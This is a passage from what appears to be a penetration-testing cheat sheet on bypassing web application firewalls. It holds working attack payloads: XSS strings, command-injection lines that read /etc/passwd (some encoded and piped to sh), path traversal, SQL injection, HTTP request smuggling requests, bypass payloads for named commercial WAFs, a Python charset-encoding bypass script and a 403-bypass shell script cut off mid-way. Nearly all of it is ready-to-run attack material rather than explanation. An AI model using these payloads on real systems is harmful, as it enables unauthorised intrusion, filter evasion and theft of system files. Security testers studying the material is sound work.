  # URL encoding in javascript: URI:
  <a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
  <iframe src="javascript:%61%6c%65%72%74%28%31%29">
  
  # Mixed encoding:
  <svg onload=\u0061\u006C\u0065\u0072\u0074(1)>
  <img src=x onerror="&#x61;lert(1)">
  <img src=x onerror="al\u0065rt(1)">
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Whitespace & Null Bytes"}
  ```txt [Payloads]
  # Breaking tag/attribute detection with whitespace/nulls
  
  # Tab and newline in tags:
  <img%09src=x%09onerror=alert(1)>
  <img%0Asrc=x%0Aonerror=alert(1)>
  <img%0Dsrc=x%0Donerror=alert(1)>
  <img%0D%0Asrc=x%0D%0Aonerror=alert(1)>
  
  # Null byte injection:
  <scr%00ipt>alert(1)</scr%00ipt>
  <img%00 src=x onerror=alert(1)>
  <%00img src=x onerror=alert(1)>
  
  # Forward slash instead of space:
  <img/src=x/onerror=alert(1)>
  <svg/onload=alert(1)>
  <input/onfocus=alert(1)/autofocus>
  
  # Multiple forward slashes:
  <img///src=x///onerror=alert(1)>
  
  # Newline inside tag name:
  <sc
  ript>alert(1)</sc
  ript>
  
  # Comment inside tag:
  <scr<!--test-->ipt>alert(1)</script>
  
  # Backtick instead of quotes:
  <img src=x onerror=`alert(1)`>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="JavaScript Protocol"}
  ```txt [Payloads]
  # javascript: URI schemes with encoding
  
  javascript:alert(1)
  JAVASCRIPT:alert(1)
  JaVaScRiPt:alert(1)
  javascript&#58;alert(1)
  javascript&#x3A;alert(1)
  javascript&#0058;alert(1)
  java%0ascript:alert(1)
  java%0dscript:alert(1)
  java%09script:alert(1)
  java%0d%0ascript:alert(1)
  j%0aavascript:alert(1)
  javas%09cript:alert(1)
  
  # data: URI:
  data:text/html,<script>alert(1)</script>
  data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
  
  # In href/src:
  <a href="javascript:alert(1)">click</a>
  <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
  
  # vbscript (IE only):
  <a href="vbscript:MsgBox(1)">click</a>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="DOM-Based / No Tags"}
  ```txt [Payloads]
  # Payloads that don't require HTML tags
  # Useful when WAF strips all < and > characters
  
  # If injecting inside existing JavaScript:
  '-alert(1)-'
  ";alert(1)//
  \';alert(1)//
  
  # Template literals:
  ${alert(1)}
  `${alert(1)}`
  
  # If inside event handler:
  " onfocus="alert(1)" autofocus="
  ' onfocus='alert(1)' autofocus='
  
  # If inside href:
  javascript:alert(1)
  
  # DOM clobbering:
  <form id=x><output id=y>1</output></form>
  <form><button formaction="javascript:alert(1)">click
  
  # SVG with xmlns:
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
  
  # MathML:
  <math><mi//xlink:href="data:x,<script>alert(1)</script>">
  
  # Without quotes or spaces:
  <svg/onload=alert(1)>
  <img/src/onerror=alert(1)>
  ```
  :::
::

---

## Command Injection WAF Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Separator Bypass"}
  ```txt [Payloads]
  # When ; | & are blocked

  # Newline as separator:
  %0a cat /etc/passwd
  %0d cat /etc/passwd
  %0a%0d cat /etc/passwd
  
  # Backtick substitution:
  `cat /etc/passwd`
  
  # $() substitution:
  $(cat /etc/passwd)
  
  # Alternative operators:
  || cat /etc/passwd
  && cat /etc/passwd
  ; cat /etc/passwd
  | cat /etc/passwd
  
  # URL encoded:
  %0Acat%20/etc/passwd
  %0A%2Fbin%2Fcat%20%2Fetc%2Fpasswd
  %7Ccat%20%2Fetc%2Fpasswd
  %26%26cat%20%2Fetc%2Fpasswd
  %3Bcat%20%2Fetc%2Fpasswd
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Space Bypass"}
  ```txt [Payloads]
  # When spaces are blocked
  
  # IFS (Internal Field Separator):
  cat${IFS}/etc/passwd
  cat$IFS/etc/passwd
  cat${IFS}$9/etc/passwd
  
  # Tab:
  cat%09/etc/passwd
  cat	/etc/passwd
  
  # Brace expansion:
  {cat,/etc/passwd}
  
  # Redirect:
  cat</etc/passwd
  cat<>/etc/passwd
  
  # Environment variables:
  X=$'\x20';cat${X}/etc/passwd
  IFS=,;cat,/etc/passwd
  
  # $IFS variants:
  cat$IFS/etc/passwd
  cat${IFS}/etc/passwd
  cat$IFS$9/etc/passwd
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Command Bypass"}
  ```txt [Payloads]
  # When "cat", "ls", "id" etc. are blocked
  
  # Quote insertion (breaks the keyword):
  c'a't /etc/passwd
  c"a"t /etc/passwd
  c\at /etc/passwd
  c$()at /etc/passwd
  
  # Variable concatenation:
  a=c;b=at;$a$b /etc/passwd
  
  # Wildcard/glob:
  /bin/c?t /etc/passwd
  /bin/ca* /etc/passwd
  /???/c?t /etc/passwd
  /???/??t /???/??????
  
  # Alternative commands:
  tac /etc/passwd           # Reverse cat
  head /etc/passwd
  tail /etc/passwd
  less /etc/passwd
  more /etc/passwd
  nl /etc/passwd
  sort /etc/passwd
  uniq /etc/passwd
  rev /etc/passwd | rev
  xxd /etc/passwd
  od -c /etc/passwd
  strings /etc/passwd
  paste /etc/passwd
  fold /etc/passwd
  cut -c1- /etc/passwd
  dd if=/etc/passwd
  diff /etc/passwd /dev/null
  sed '' /etc/passwd
  awk '{print}' /etc/passwd
  
  # Bash built-ins:
  while read line; do echo $line; done < /etc/passwd
  
  # Base64 encoded command:
  echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
  bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
  
  # Hex encoded:
  echo 636174202f6574632f706173737764 | xxd -r -p | sh
  
  # $() with encoding:
  $(echo${IFS}Y2F0IC9ldGMvcGFzc3dk${IFS}|${IFS}base64${IFS}-d)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Path Bypass"}
  ```txt [Payloads]
  # When /etc/passwd or specific paths are blocked
  
  # Variable insertion:
  /e"t"c/pa"s"swd
  /e'tc'/pa'ss'wd
  /e\tc/pa\sswd
  
  # Environment variable:
  cat $HOME/../../../etc/passwd
  
  # Symlinks / proc:
  cat /proc/self/environ
  cat /proc/version
  cat /proc/self/fd/0
  
  # Globbing:
  cat /e??/p???wd
  cat /e*/p*d
  cat /e[t]c/p[a]sswd
  
  # Unicode normalization:
  cat /etc／passwd    (fullwidth /)
  
  # Encoding path:
  cat $(echo /etc/passwd | tr ' ' ' ')
  cat $(printf '/etc/passwd')
  ```
  :::
::

---

## Path Traversal WAF Bypass

```txt [Payloads]
# Standard path traversal (usually blocked):
../../../etc/passwd

# Encoding variations:
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd

# Double encoding:
%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%252f..%252f..%252fetc%252fpasswd

# Unicode / UTF-8 overlong:
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
..%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# IIS specific:
..%5c..%5c..%5cetc%5cpasswd
..\/..\/..\/etc\/passwd
....\\....\\....\\etc\\passwd
..%255c..%255c..%255cetc%255cpasswd

# Null byte (older systems):
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html

# Dot-dot variations:
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
..%00/..%00/..%00/etc/passwd

# Backslash:
..\..\..\etc\passwd
..\\..\\..\\etc\\passwd

# Path normalization tricks:
/etc/passwd
./etc/passwd
/etc/./passwd
/etc/../etc/passwd
/var/../etc/passwd
/etc/passwd/.
```

---

## Content-Type & Encoding Tricks

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Content-Type Switch"}
  ```txt [Payloads]
  # WAF may only inspect specific Content-Types
  
  # Standard (inspected by WAF):
  Content-Type: application/json
  {"input":"<script>alert(1)</script>"}
  
  # Switch to form data (might bypass):
  Content-Type: application/x-www-form-urlencoded
  input=%3Cscript%3Ealert(1)%3C%2Fscript%3E
  
  # Multipart (complex parsing, often poorly handled by WAFs):
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="input"
  
  <script>alert(1)</script>
  ------WebKitFormBoundary--
  
  # XML:
  Content-Type: application/xml
  <input><![CDATA[<script>alert(1)</script>]]></input>
  
  # Text/plain:
  Content-Type: text/plain
  {"input":"<script>alert(1)</script>"}
  
  # Missing Content-Type entirely:
  (remove Content-Type header)
  
  # Invalid Content-Type:
  Content-Type: application/doesnotexist
  Content-Type: text/x-shellscript
  Content-Type: application/octet-stream
  
  # Charset tricks:
  Content-Type: application/json; charset=ibm037
  Content-Type: application/json; charset=utf-7
  Content-Type: application/json; charset=utf-16
  Content-Type: application/json; charset=cp037
  Content-Type: application/x-www-form-urlencoded; charset=ibm037
  
  # IBM037 encoding (mainframe codepage):
  # Translates normal ASCII to EBCDIC
  # WAF can't read EBCDIC, app converts it back
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Chunked Transfer Encoding"}
  ```txt [Payloads]
  # Split payload across HTTP chunks
  # WAF may inspect each chunk independently
  # Missing the full payload across chunks
  
  POST /api/endpoint HTTP/1.1
  Host: target.com
  Transfer-Encoding: chunked
  Content-Type: application/x-www-form-urlencoded
  
  3
  id=
  7
  1 UNION
  8
   SELECT
  5
   1,2,
  3
  3--
  0
  
  
  # Chunked with comments:
  POST /api/endpoint HTTP/1.1
  Transfer-Encoding: chunked
  
  1
  '
  4
   OR
  5
   1=1-
  1
  -
  0
  
  
  # Very small chunks (1 byte each):
  1
  <
  1
  s
  1
  c
  1
  r
  1
  i
  1
  p
  1
  t
  1
  >
  0
  
  # This fragments the payload so no single chunk
  # contains a detectable pattern
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Charset / Encoding Bypass"}
  ```python [charset_bypass.py]
  #!/usr/bin/env python3
  """
  WAF Bypass via Charset Encoding
  Send payload in IBM037/EBCDIC encoding
  """
  import requests
  
  TARGET = "https://target.com/api/endpoint"
  
  # Normal payload (blocked by WAF):
  payload = "' OR 1=1--"
  
  # Encode in IBM037 (EBCDIC)
  encoded_payload = payload.encode('ibm037')
  
  headers = {
      "Content-Type": "application/x-www-form-urlencoded; charset=ibm037"
  }
  
  # Send with charset specified
  data = ("input=" + payload).encode('ibm037')
  
  resp = requests.post(TARGET, data=data, headers=headers)
  print(f"Status: {resp.status_code}")
  print(f"Body: {resp.text[:200]}")
  
  # Alternative charsets to try:
  charsets = [
      'ibm037', 'ibm500', 'ibm1026',
      'utf-7', 'utf-16', 'utf-16be', 'utf-16le',
      'utf-32', 'utf-32be', 'utf-32le',
      'cp037', 'cp500', 'cp875', 'cp1026',
      'iso-8859-1', 'iso-8859-15',
      'shift_jis', 'euc-jp', 'gb2312', 'big5',
  ]
  
  for charset in charsets:
      try:
          data = ("input=" + payload).encode(charset)
          headers = {
              "Content-Type": f"application/x-www-form-urlencoded; charset={charset}"
          }
          resp = requests.post(TARGET, data=data, headers=headers, timeout=10)
          if resp.status_code != 403:
              print(f"[+] {charset}: HTTP {resp.status_code} (potential bypass)")
      except Exception as e:
          pass
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="UTF-7 Encoding"}
  ```txt [Payloads]
  # UTF-7 encoding bypass (if app accepts charset=utf-7)
  
  # XSS in UTF-7:
  +ADw-script+AD4-alert(1)+ADw-/script+AD4-
  +ADw-img src=x onerror=alert(1)+AD4-
  +ADw-svg onload=alert(1)+AD4-
  
  # UTF-7 encoding reference:
  # < = +ADw-
  # > = +AD4-
  # " = +ACI-
  # ' = +ACc-
  # ( = +ACg-
  # ) = +ACk-
  # / = +AC8-
  # = = +AD0-
  # ; = +ADs-
  
  # Force UTF-7 interpretation:
  Content-Type: text/html; charset=utf-7
  
  # In response injection:
  +ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
  ```
  :::
::

---

## HTTP Parameter Pollution

```txt [Payloads]
# Send the same parameter multiple times
# WAF and backend may parse different values

# URL parameters:
?id=1&id=2 UNION SELECT 1,2,3--
# WAF might check: id=1 (safe)
# Backend might use: id=2 UNION SELECT 1,2,3-- (malicious)

# Backend parameter precedence varies:
# PHP/Apache:     Last parameter wins  → id=2
# ASP.NET/IIS:    Comma-joined        → id=1,2
# JSP/Tomcat:     First parameter     → id=1
# Python/Django:  Last parameter      → id=2
# Ruby/Rails:     Last parameter      → id=2
# Node/Express:   First or array      → id=[1,2]

# Exploitation:
# If WAF checks FIRST param, backend uses LAST:
?id=1&id=' UNION SELECT 1,2,3--

# If WAF checks LAST param, backend uses FIRST:
?id=' UNION SELECT 1,2,3--&id=1

# Mixed URL + Body:
GET /page?id=1
POST body: id=' OR 1=1--

# Mixed case parameter names:
?id=1&ID=' OR 1=1--
?id=1&Id=' OR 1=1--

# Array notation:
?id[]=1&id[]=' OR 1=1--
?id=1&id[]=' OR 1=1--

# JSON body pollution:
{"id":"1","id":"' OR 1=1--"}
{"id":1,"ID":"' OR 1=1--"}
```

---

## Request Smuggling

::warning
Request smuggling exploits **parsing differences** between front-end (WAF/proxy) and back-end servers. This is one of the most powerful WAF bypass techniques but requires careful testing to avoid disrupting other users.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="CL.TE Smuggling"}
  ```txt [Payloads]
  # Front-end uses Content-Length
  # Back-end uses Transfer-Encoding

  POST / HTTP/1.1
  Host: target.com
  Content-Length: 13
  Transfer-Encoding: chunked

  0

  SMUGGLED_REQUEST_HERE

  # Example - Smuggle SQLi past WAF:
  POST /api/data HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 60
  Transfer-Encoding: chunked

  0

  GET /api/data?id=1'+UNION+SELECT+1,2,3-- HTTP/1.1
  Host: target.com
  X-Ignore: X

  # WAF sees: Normal POST with chunked body ending at "0"
  # Backend sees: POST + smuggled GET with SQLi payload
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="TE.CL Smuggling"}
  ```txt [Payloads]
  # Front-end uses Transfer-Encoding
  # Back-end uses Content-Length

  POST / HTTP/1.1
  Host: target.com
  Content-Length: 4
  Transfer-Encoding: chunked

  78
  POST /api/data HTTP/1.1
  Host: target.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 30

  id=1'+OR+1=1--
  0

  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="TE.TE Obfuscation"}
  ```txt [Payloads]
  # Both use Transfer-Encoding but one can be confused
  
  # Obfuscated Transfer-Encoding headers:
  Transfer-Encoding: chunked
  Transfer-Encoding: x

  Transfer-Encoding: chunked
  Transfer-encoding: x

  Transfer-Encoding: chunked
  Transfer-Encoding : chunked

  Transfer-Encoding: chunked
  Transfer-Encoding: xchunked

  Transfer-Encoding : chunked

  Transfer-Encoding: chunked
  Transfer-encoding: cow

  Transfer-Encoding
  : chunked

  Transfer-Encoding: chunked
  Content-Encoding: chunked

  X: X[\n]Transfer-Encoding: chunked

  Transfer-Encoding:chunked
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="HTTP/2 Desync"}
  ```txt [Concept]
  # HTTP/2 → HTTP/1.1 downgrade smuggling
  # CDN/WAF speaks HTTP/2, origin speaks HTTP/1.1

  # Inject HTTP/1.1 headers via HTTP/2 pseudo-headers:
  :method: POST
  :path: /api/data
  :authority: target.com
  content-length: 0
  transfer-encoding: chunked

  0

  GET /admin HTTP/1.1
  Host: target.com

  # HTTP/2 front-end sees one valid H2 request
  # HTTP/1.1 backend sees TWO requests (smuggled)

  # H2.CL desync:
  :method: POST
  :path: /
  :authority: target.com
  content-length: 0

  GET /admin HTTP/1.1
  Host: target.com

  # Tools for testing:
  # - Burp Suite HTTP/2 support
  # - h2csmuggler
  # - smuggler.py
  ```
  :::
::

```bash [Terminal]
# Automated smuggling detection

# smuggler.py
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u "https://target.com"

# h2csmuggler (HTTP/2 cleartext smuggling)
git clone https://github.com/BishopFox/h2csmuggler.git
python3 h2csmuggler.py -x "https://target.com" --test

# Burp Suite Scanner (automatically detects request smuggling)
# Use Active Scan on target endpoints

# nuclei templates
echo "https://target.com" | nuclei -tags smuggling
```

---

## Protocol-Level Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="HTTP/2 Exclusive Features"}
  ```txt [Payloads]
  # HTTP/2 pseudo-headers that HTTP/1.1 WAFs don't inspect

  # Header injection via H2 pseudo-headers:
  :method: GET
  :path: /api/data?id=1' OR 1=1--
  :authority: target.com
  x-custom: value\r\nInjected-Header: malicious

  # CRLF injection in H2 header values:
  :path: /api/data\r\nX-Injected: payload

  # Underscore in header names (H2 allows, H1 normalizes):
  x_forwarded_for: 127.0.0.1

  # Very long header values:
  # Some WAFs truncate headers at N bytes
  # Place payload after byte N
  x-padding: AAAAAA....(4096 bytes)....PAYLOAD_HERE

  # Force HTTP/2:
  curl --http2 "https://target.com/api/data?id=1'+OR+1=1--"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="WebSocket Upgrade"}
  ```txt [Payloads]
  # Upgrade to WebSocket to bypass HTTP-level WAF inspection
  
  # Standard WebSocket upgrade:
  GET /ws HTTP/1.1
  Host: target.com
  Upgrade: websocket
  Connection: Upgrade
  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
  Sec-WebSocket-Version: 13
  
  # After upgrade, WAF may stop inspecting traffic
  # Send malicious payloads over WebSocket frames
  
  # h2c upgrade smuggling:
  GET / HTTP/1.1
  Host: target.com
  Upgrade: h2c
  HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
  Connection: Upgrade, HTTP2-Settings
  
  # If h2c upgrade succeeds:
  # → Subsequent traffic is HTTP/2 cleartext
  # → WAF may not inspect HTTP/2 frames
  # → Send SQLi/XSS payloads via HTTP/2
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="HTTP/0.9"}
  ```txt [Concept]
  # HTTP/0.9 has no headers, no status line
  # Just raw response body
  # Some servers still support it

  # Send HTTP/0.9 request:
  GET /api/data?id=1'+OR+1=1--

  # No HTTP version, no headers
  # WAF might not know how to parse this
  # Server responds with raw body only

  # Combined with request smuggling:
  POST / HTTP/1.1
  Host: target.com
  Content-Length: 50
  
  GET /api/data?id=1'+OR+1=1-- HTTP/0.9
  Host: target.com
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="IP Layer Tricks"}
  ```txt [Techniques]
  # IP fragmentation:
  # Fragment TCP packets so WAF can't reassemble payload
  # Requires raw socket access
  
  # Using Scapy (Python):
  from scapy.all import *
  
  # Create fragmented IP packets
  # WAF may not defragment before inspection
  
  # IPv6 (if target supports):
  # Many WAFs only inspect IPv4 traffic
  # Same server on IPv6 might bypass WAF entirely
  curl -6 "https://[IPv6_ADDRESS]/" -H "Host: target.com"
  
  # Different ports:
  # WAF might only inspect ports 80/443
  # Try port 8080, 8443, 4443, etc.
  curl "https://target.com:8443/api/data?id=1'+OR+1=1--"
  ```
  :::
::

---

## WAF-Specific Bypass Payloads

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Cloudflare"}
  ```txt [Payloads]
  # Cloudflare WAF bypass payloads (2024-2025)
  
  # XSS:
  <svg onload=alert(1)>
  <details/open/ontoggle=confirm(1)>
  <img src=x onerror=alert`1`>
  <svg/onload=self['aler'+'t'](1)>
  <math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">
  <input onfocus=alert(1) autofocus>
  <video><source onerror=alert(1)>
  <audio src/onerror=alert(1)>
  <svg><animate onbegin=alert(1)>
  <marquee onstart=alert(1)>
  
  # SQLi:
  ' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
  ' UN/**/ION SE/**/LECT 1,2,3--
  ' UNION ALL%23%0ASELECT 1,2,3--
  ' UNION%0ASELECT%0A1,2,3--
  1' aNd 1=1#
  -1' union select 1,2,3,4,5,6,7,8,9,0,11,12,13,14,15,16,17,18,19,20--
  
  # RCE:
  ;cat${IFS}/etc/passwd
  ;c'a't${IFS}/etc/passwd
  $(cat${IFS}/etc/passwd)
  `cat${IFS}/etc/passwd`
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ModSecurity / OWASP CRS"}
  ```txt [Payloads]
  # ModSecurity OWASP Core Rule Set bypass
  
  # SQLi (paranoia level 1-2):
  ' /*!50000UniOn*/ /*!50000SeLeCt*/ 1,2,3--
  ' /*!12345UNION*//*!12345SELECT*/1,2,3--
  '%0AuNiOn%0AsElEcT%0A1,2,3--
  ' UNION%09SELECT%091,2,3--
  1'||1#
  0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
  
  # XSS (paranoia level 1-2):
  <svg/onload=alert(1)>
  <img src=x onerror=alert(1)>
  <details open ontoggle=alert(1)>
  <input onfocus=alert(1) autofocus>
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</sVg/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  
  # Command injection:
  ;c'a't${IFS}/etc/passwd
  ;ca\t /etc/passwd
  $(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
  {cat,/etc/passwd}
  
  # CRS-specific bypass (paranoia level dependent):
  # PL1: Basic rules - many bypasses available
  # PL2: Stricter - need encoding tricks
  # PL3: Very strict - need smuggling/origin bypass
  # PL4: Extremely strict - origin bypass usually required
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="AWS WAF"}
  ```txt [Payloads]
  # AWS WAF managed rules bypass
  
  # SQLi:
  ' UnIoN(SeLeCt(1),(2),(3))--
  '%09UNION%09SELECT%091,2,3--
  ' UNION%0bSELECT%0b1,2,3--
  ' uni%6fn sel%65ct 1,2,3--
  
  # XSS:
  <img src=x onerror=alert(1)>
  <svg/onload=alert(1)>
  <details/open/ontoggle=alert(1)>
  <input/onfocus=alert(1)/autofocus>
  
  # Header-based bypass:
  X-Forwarded-For: 127.0.0.1
  X-Original-URL: /admin
  
  # API Gateway bypass:
  # Different stages may have different rules
  # Try dev/staging stages if discoverable
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Imperva / Incapsula"}
  ```txt [Payloads]
  # Imperva SecureSphere / Incapsula bypass
  
  # SQLi:
  ' /*!50000%75niOn*/ /*!50000%73ElEcT*/ 1,2,3--
  ' %55nion(%53elect 1,2,3)--
  ' unION seLECT 1,2,3--
  '%0AuNiOn%0AsElEcT%0A1,2,3--
  
  # XSS:
  <svg/onload=alert(1)>
  <details open ontoggle=confirm(1)>
  <img/src/onerror=alert(1)>
  <svg onload=top.alert(1)>
  <input value=1 onfocus=alert(1) autofocus>
  
  # Bypass cookies:
  # Remove visid_incap_* and incap_ses_* cookies
  # May bypass client-side challenges
  
  # Origin bypass is most effective:
  # Find origin IP via DNS history
  # Connect directly, bypassing Imperva entirely
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="F5 BIG-IP ASM"}
  ```txt [Payloads]
  # F5 Advanced WAF / BIG-IP ASM bypass
  
  # SQLi:
  ' UNION%23%0ASELECT 1,2,3--
  ' /*!UNION*/ /*!SELECT*/ 1,2,3--
  ' OR%091=1--
  ' AND%0A1=1--
  1' HAVING 1=1--
  
  # XSS:
  <svg onload=alert(1)>
  <img src=x oneonerrorrror=alert(1)>  (double keyword)
  <body/onload=alert(1)>
  <object data="javascript:alert(1)">
  
  # Parameter tampering:
  # F5 tracks parameter names
  # Add unexpected parameters to confuse learning
  ```
  :::
::

---

## Automated WAF Bypass Tools

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="WAFNinja"}
  ```bash [Terminal]
  # WAFNinja - WAF bypass testing tool
  git clone https://github.com/khalilbijjou/WAFNinja.git
  cd WAFNinja
  python3 wafninja.py -u "https://target.com/page?id=FUZZ" -t xss
  python3 wafninja.py -u "https://target.com/page?id=FUZZ" -t sqli
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="WAFBypass"}
  ```bash [Terminal]
  # WAFBypass - Automated payload testing
  git clone https://github.com/nemesida-waf/waf-bypass.git
  cd waf-bypass
  pip3 install -r requirements.txt
  
  python3 main.py --host target.com --proxy http://127.0.0.1:8080
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Bypass-403"}
  ```bash [Terminal]
  # bypass-403 - Bypass 403/401 restrictions
  git clone https://github.com/iamj0ker/bypass-403.git
  cd bypass-403
  bash bypass-403.sh https://target.com /admin
  
  # What it tests:
  # - Path manipulation (/admin → /Admin, //admin, /./admin)
  # - Header injection (X-Original-URL, X-Rewrite-URL)
  # - Method change (GET, POST, PUT, etc.)
  # - URL encoding variations
  # - HTTP version downgrade
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="403bypasser"}
  ```bash [Terminal]
  # 403bypasser - Comprehensive forbidden bypass
  git clone https://github.com/yunemse48/403bypasser.git
  cd 403bypasser
  pip3 install -r requirements.txt
  python3 403bypasser.py -u https://target.com -d /admin
  
  # Tests:
  # - Header payloads (X-Forwarded-For, X-Custom-IP-Authorization, etc.)
  # - Path payloads (/admin/, /admin.., /admin;/, etc.)
  # - Method payloads (GET, POST, PUT, PATCH, etc.)
  # - Protocol payloads (HTTP/1.0, HTTP/1.1, HTTP/2)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="nuclei WAF Templates"}
  ```bash [Terminal]
  # nuclei templates for WAF bypass
  
  # WAF detection
  echo "https://target.com" | nuclei -tags waf
  
  # 403 bypass
  echo "https://target.com/admin" | nuclei \
    -t ~/nuclei-templates/http/fuzzing/header-command-injection.yaml
  
  # Technology detection
  echo "https://target.com" | nuclei -tags tech
  
  # Update templates
  nuclei -update-templates
  ```
  :::
::

---

## 403/401 Forbidden Bypass

When a WAF or proxy returns 403 Forbidden or 401 Unauthorized, try these techniques to access the protected resource.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Header Injection"}
  ```txt [Payloads]
  # Headers that override the original URL or client IP
  # causing the WAF to evaluate a different resource
  
  # URL override headers:
  X-Original-URL: /admin
  X-Rewrite-URL: /admin
  X-Override-URL: /admin
  X-Forwarded-Path: /admin
  X-Custom-IP-Authorization: 127.0.0.1
  X-Forwarded-For: 127.0.0.1
  X-Real-IP: 127.0.0.1
  X-Originating-IP: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Remote-Addr: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-Host: 127.0.0.1
  X-Forwarded-Host: 127.0.0.1
  
  # Combine URL override + IP spoof:
  GET / HTTP/1.1
  Host: target.com
  X-Original-URL: /admin
  X-Forwarded-For: 127.0.0.1
  
  # Referer trick:
  Referer: https://target.com/admin
  
  # Content-Length: 0 on GET:
  GET /admin HTTP/1.1
  Content-Length: 0
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Path Manipulation"}
  ```txt [Payloads]
  # Target endpoint: /admin (returns 403)
  
  # Try these variations:
  /admin
  /Admin
  /ADMIN
  /aDmIn
  /admin/
  /admin//
  /./admin
  /./admin/./
  //admin
  //admin//
  /admin.
  /admin..
  /admin..;/
  /admin;/
  /admin/..;/
  /admin%20
  /admin%09
  /admin%00
  /admin%0d%0a
  /%2fadmin
  /admin%2f
  /%61dmin
  /%61%64%6d%69%6e
  /admin?
  /admin??
  /admin?anything
  /admin#
  /admin#fragment
  /admin/.
  /admin/./
  /admin/..
  /admin/../admin
  /admin/../../admin
  /.admin
  /admin.html
  /admin.php
  /admin.json
  /admin.xml
  /ADMIN/
  /admin;.css
  /admin;.js
  /admin;.html
  /Admin/
  /adMin/
  /admin%252f
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Method & Protocol"}
  ```txt [Payloads]
  # HTTP method change:
  GET /admin → POST /admin
  GET /admin → PUT /admin
  GET /admin → PATCH /admin
  GET /admin → DELETE /admin
  GET /admin → OPTIONS /admin
  GET /admin → HEAD /admin
  GET /admin → TRACE /admin
  
  # Method override headers:
  GET /admin HTTP/1.1
  X-HTTP-Method-Override: POST
  
  POST / HTTP/1.1
  X-Original-URL: /admin
  
  # Protocol version:
  GET /admin HTTP/1.0
  GET /admin HTTP/0.9
  GET /admin HTTP/2
  
  # With different Host headers:
  GET /admin HTTP/1.1
  Host: localhost
  
  GET /admin HTTP/1.1
  Host: 127.0.0.1
  
  GET /admin HTTP/1.1
  Host: target.com:443
  
  GET /admin HTTP/1.1
  Host: target.com:80
  
  GET /admin HTTP/1.1
  Host: TARGET.COM
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Automated Script"}
  ```bash [bypass_403.sh]
  #!/bin/bash
  # 403 Bypass Testing Script
  # Usage: ./bypass_403.sh https://target.com /admin
  
  URL=$1
  PATH=$2
  
  if [ -z "$URL" ] || [ -z "$PATH" ]; then
    echo "Usage: $0 <url> <path>"
    exit 1
  fi
  
  echo "============================================"
  echo "  403 BYPASS TESTER"
  echo "  URL: $URL"
  echo "  Path: $PATH"
  echo "============================================"
  
  # Path variations
  echo -e "\n[*] Path variations:"
  PATHS=(
    "$PATH" "${PATH}/" "${PATH}/." "${PATH}/.." "${PATH}..;/"
